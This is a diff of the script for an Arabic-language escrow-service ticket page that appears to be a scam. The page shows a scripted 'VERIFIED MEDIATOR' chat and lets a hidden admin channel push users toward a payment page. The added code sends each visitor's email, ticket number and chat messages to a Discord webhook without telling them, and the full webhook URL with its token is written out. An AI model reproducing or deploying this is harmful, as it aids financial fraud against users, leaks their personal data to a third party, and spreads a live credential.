@@ -1,163 +1,60 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <title>تذكرة وساطة | Wasata Elite</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        body { background: #05060b; color: white; font-family: sans-serif; overflow: hidden; }
-        .message { margin-bottom: 15px; padding: 12px 18px; border-radius: 18px; max-width: 85%; position: relative; }
-        .msg-admin { background: #1a1d2e; border: 1px solid rgba(255,255,255,0.05); align-self: flex-start; border-bottom-right-radius: 2px; }
-        .msg-user { background: #eab308; color: black; align-self: flex-end; border-bottom-left-radius: 2px; font-weight: 600; }
-        .admin-badge { background: #eab308; color: black; font-size: 8px; padding: 2px 6px; border-radius: 4px; font-weight: 900; margin-left: 5px; vertical-align: middle; }
-        .bg-dots { position: fixed; inset: 0; z-index: -1; background-image: radial-gradient(#ffffff08 1.5px, transparent 1.5px); background-size: 25px 25px; }
-        #paymentNotice { display: none; background: linear-gradient(to right, #eab30822, transparent); animation: slideUp 0.5s ease-out; }
-        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
-    </style>
-</head>
-<body class="flex flex-col h-screen">
-    <div class="bg-dots"></div>
+/* استبدل الجزء الخاص بالإرسال في ملف ticket.html بهذا الكود */
 
-    <nav class="p-4 flex justify-between items-center bg-black/40 backdrop-blur-xl border-b border-white/5">
-        <div class="flex items-center gap-3">
-            <div class="text-xl font-black text-yellow-500 cursor-pointer" onclick="location.href='index.html'">🛡️ وساطة</div>
-            <div id="ticketID" class="text-[10px] bg-white/5 px-2 py-1 rounded border border-white/10 text-gray-400">#16251</div>
-        </div>
-        <div class="flex items-center gap-4">
-            <div class="text-left">
-                <p class="text-[9px] text-gray-500 uppercase leading-none mb-1">حالة المعاملة</p>
-                <span id="ticketStatus" class="text-[11px] text-yellow-500 font-bold px-2 py-1 bg-yellow-500/10 rounded-lg border border-yellow-500/20">جاري التحقق..</span>
-            </div>
-            <div class="bg-yellow-500 text-black px-4 py-1 rounded-xl text-xs font-black shadow-lg" id="uName">...</div>
-        </div>
-    </nav>
+// ضع رابط الويب هوك الخاص بك هنا
+const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1511676605993586688/8IXSL1WEEVCqcQAD49qytkBz3Edk7PBH-ODmM18FGH1PYoVYMeDqYtj5udkWcm7ybNL0"; 
 
-    <div class="flex-1 flex flex-col max-w-4xl mx-auto w-full p-4 overflow-hidden">
-        <!-- نموذج إعداد التذكرة الجديد -->
-        <div id="setupForm" class="bg-[#111218] p-8 rounded-[2.5rem] border border-white/10 mb-4 shadow-2xl">
-            <h3 class="font-black text-2xl mb-6 text-center">فتح طلب وساطة جديد</h3>
-            <div class="space-y-4">
-                <div class="bg-black/40 p-4 rounded-2xl border border-white/5">
-                    <label class="text-xs text-gray-500 block mb-2">نوع الخدمة المكتملة</label>
-                    <select id="type" class="w-full bg-transparent border-none text-sm outline-none font-bold text-yellow-500">
-                        <option value="alert">وساطة + حماية ضد الاسترداد (توصية)</option>
-                        <option value="normal">وساطة عادية (تأمين نقل)</option>
-                    </select>
-                </div>
-                <div class="bg-black/40 p-4 rounded-2xl border border-white/5">
-                    <label class="text-xs text-gray-500 block mb-2">قيمة المعاملة (SAR)</label>
-                    <input type="number" id="amount" value="500" class="w-full bg-transparent border-none text-xl font-black outline-none">
-                </div>
-            </div>
-            <button onclick="startChat()" class="w-full mt-8 bg-yellow-500 text-black py-5 rounded-2xl font-black text-lg hover:scale-[1.02] transition shadow-lg shadow-yellow-500/20">بدأ المحادثة مع الوسيط</button>
-        </div>
+function startChat(isReturning = false) {
+    document.getElementById('setupForm').classList.add('hidden');
+    document.getElementById('chatArea').classList.remove('hidden');
+    
+    if(!isReturning) {
+        updateStatus("انتظار دخول الوسيط");
+        
+        // إرسال إشعار فوري لديسكورد بأن هناك شخص فتح تذكرة
+        sendToDiscord("🎫 **تذكرة جديدة مفتوحة!**", `العميل: ${session.email}\nرقم التذكرة: ${localStorage.getItem('wasata_ticket_id')}\nالحالة: ينتظر الوسيط الآن.`);
 
-        <!-- ساحة المحادثة -->
-        <div id="chatArea" class="hidden flex-1 flex flex-col bg-[#111218]/50 rounded-[2rem] border border-white/5 overflow-hidden backdrop-blur-md">
-            <div id="messageList" class="flex-1 overflow-y-auto p-6 flex flex-col scroll-smooth">
-                <div class="msg-admin message">نظام: أهلاً بك. تم تعيين الوسيط "Waseet_Security" لإتمام معاملتك. يرجى الانتظار لحين مراجعة البيانات.</div>
-            </div>
-            
-            <div id="paymentNotice" class="p-5 border-t border-yellow-500/30">
-                <div class="flex items-center justify-between">
-                    <div class="flex items-center gap-3">
-                        <div class="p-2 bg-yellow-500 text-black rounded-lg">💳</div>
-                        <div>
-                            <p class="text-sm font-black text-white">الوسيط يطلب إتمام الدفع</p>
-                            <p class="text-[10px] text-gray-400">انقر للاستمرار لبوابة الدفع الآمنة ووضع عربون الوساطة</p>
-                        </div>
-                    </div>
-                    <button onclick="location.href='payment.html'" class="bg-yellow-500 text-black px-8 py-3 rounded-xl font-black text-xs hover:scale-105 transition">دفع الآن</button>
-                </div>
-            </div>
+        setTimeout(() => {
+            receiveMsg("Waseet_Security", "أهلاً بك يا غالي. أنا الوسيط المسؤول عن هذه العملية. يرجى تأكيد المبلغ المطلوب ووسيلة التسليم.");
+            updateStatus("جاري المراجعة");
+        }, 2000);
+    }
+}
 
-            <div class="p-4 bg-black/40 flex gap-3">
-                <input id="userMsg" type="text" placeholder="اكتب للوسيط هنا..." class="flex-1 bg-white/5 border border-white/10 rounded-2xl px-5 py-3 text-sm outline-none focus:border-yellow-500 transition">
-                <button onclick="sendMsg()" class="bg-yellow-500 text-black w-12 h-12 rounded-2xl flex items-center justify-center font-bold font-sans">←</button>
-            </div>
-        </div>
-    </div>
+function sendMsg() {
+    const input = document.getElementById('userMsg');
+    if(!input.value) return;
+    const msg = input.value;
+    
+    const list = document.getElementById('messageList');
+    const div = document.createElement('div');
+    div.className = "msg-user message shadow-xl";
+    div.innerText = msg;
+    list.appendChild(div);
+    
+    // 1. حفظ محلي للأدمن (إذا كان يراقب من نفس الجهاز)
+    const chatLog = JSON.parse(localStorage.getItem('admin_inbox') || '[]');
+    chatLog.push({ user: session.email, msg: msg, time: new Date().toLocaleTimeString() });
+    localStorage.setItem('admin_inbox', JSON.stringify(chatLog));
 
-    <script>
-        const session = JSON.parse(localStorage.getItem('wasata_session'));
-        if(!session) location.href='login.html';
+    // 2. إرسال عالمي لديسكورد (ليصلك على جوالك في أي مكان)
+    sendToDiscord(`💬 رسالة من ${session.email.split('@')[0]}`, msg);
 
-        function initTicket() {
-            let ticketID = localStorage.getItem('wasata_ticket_id');
-            const uName = session.email.split('@')[0];
-            
-            // أول تذكرة رقمها الثابت 16251 وبقية الأرقام عشوائية للتذاكر اللاحقة
-            if (!ticketID) {
-                ticketID = "#16251";
-                localStorage.setItem('wasata_ticket_id', ticketID);
-            } else {
-                // إذا كان لديه تذكرة سابقة، يفتح الشات مباشرة
-                startChat(true);
-            }
+    input.value = "";
+    list.scrollTop = list.scrollHeight;
+}
 
-            document.getElementById('uName').innerText = uName;
-            document.getElementById('ticketID').innerText = ticketID;
-        }
-
-        function startChat(isReturning = false) {
-            document.getElementById('setupForm').classList.add('hidden');
-            document.getElementById('chatArea').classList.remove('hidden');
-            
-            if(!isReturning) {
-                updateStatus("انتظار دخول الوسيط");
-                setTimeout(() => {
-                    receiveMsg("Waseet_Security", "أهلاً بك يا غالي. أنا الوسيط المسؤول عن هذه العملية. يرجى تأكيد المبلغ المطلوب ووسيلة التسليم.");
-                    updateStatus("جاري المراجعة");
-                }, 2000);
-            }
-        }
-
-        function sendMsg() {
-            const input = document.getElementById('userMsg');
-            if(!input.value) return;
-            const msg = input.value;
-            
-            const list = document.getElementById('messageList');
-            const div = document.createElement('div');
-            div.className = "msg-user message shadow-xl";
-            div.innerText = msg;
-            list.appendChild(div);
-            
-            const chatLog = JSON.parse(localStorage.getItem('admin_inbox') || '[]');
-            chatLog.push({ user: session.email, msg: msg, time: new Date().toLocaleTimeString() });
-            localStorage.setItem('admin_inbox', JSON.stringify(chatLog));
-
-            input.value = "";
-            list.scrollTop = list.scrollHeight;
-        }
-
-        function receiveMsg(adminName, text) {
-            const list = document.getElementById('messageList');
-            if(!list) return;
-            const div = document.createElement('div');
-            div.className = "msg-admin message shadow-lg";
-            div.innerHTML = `<span class="text-[10px] font-black text-yellow-500 block mb-1 uppercase tracking-tighter">${adminName} <span class="admin-badge">VERIFIED MEDIATOR</span></span> ${text}`;
-            list.appendChild(div);
-            list.scrollTop = list.scrollHeight;
-        }
-
-        function updateStatus(status) {
-            document.getElementById('ticketStatus').innerText = status;
-        }
-
-        window.addEventListener('storage', (e) => {
-            if(e.key === 'admin_instruction') {
-                const data = JSON.parse(e.newValue);
-                if(data.targetUser === session.email) {
-                    if(data.msg && data.msg !== "طلب دفع مالي") receiveMsg("Waseet_Security", data.msg);
-                    if(data.action === 'showPay') document.getElementById('paymentNotice').style.display = 'block';
-                    if(data.status) updateStatus(data.status);
-                }
-            }
-        });
-
-        // تشغيل النظام
-        initTicket();
-    </script>
-</body>
-</html>
+function sendToDiscord(title, message) {
+    fetch(DISCORD_WEBHOOK, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            embeds: [{
+                title: title,
+                description: message,
+                color: 16762880, // لون أصفر وساطة
+                footer: { text: "Wasata Global System v9.4" },
+                timestamp: new Date().toISOString()
+            }]
+        })
+    });
+}
